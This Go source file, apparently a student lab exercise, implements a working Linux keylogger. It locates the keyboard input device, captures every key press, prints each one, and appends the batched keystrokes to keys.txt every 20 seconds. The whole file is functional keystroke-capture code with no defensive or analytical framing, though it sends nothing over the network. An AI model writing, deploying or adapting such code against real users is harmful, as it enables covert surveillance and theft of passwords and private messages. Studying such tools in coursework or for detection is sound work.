package main

import (
	"log"
	"os"
	"time"

	"github.com/Muha113/6-th-term-labs/osis/lab5/keylogs"
	"github.com/sirupsen/logrus"
)

func saveToFile(ch chan []string) {
	for {
		keys := <-ch
		file, err := os.OpenFile("keys.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatalln(err)
		}
		for _, v := range keys {
			file.WriteString(v)
		}
	}
}

func timer(ch chan bool) {
	for {
		time.Sleep(20 * time.Second)
		ch <- true
	}
}

func main() {
	keyboard := keylogs.FindKeyboardDevice()

	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println("Found a keyboard at", keyboard)
	k, err := keylogs.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	ch := make(chan []string)
	done := make(chan bool)
	keys := make([]string, 0)

	go saveToFile(ch)
	go timer(done)

	for e := range events {
		switch e.Type {
		case keylogs.EvKey:

			if e.KeyPress() {
				logrus.Println("[event] press key ", e.KeyString())
				select {
				case <-done:
					ch <- keys
					keys = nil
				default:
					keys = append(keys, e.KeyString())
				}
			}

			break
		}
	}
	close(ch)
}
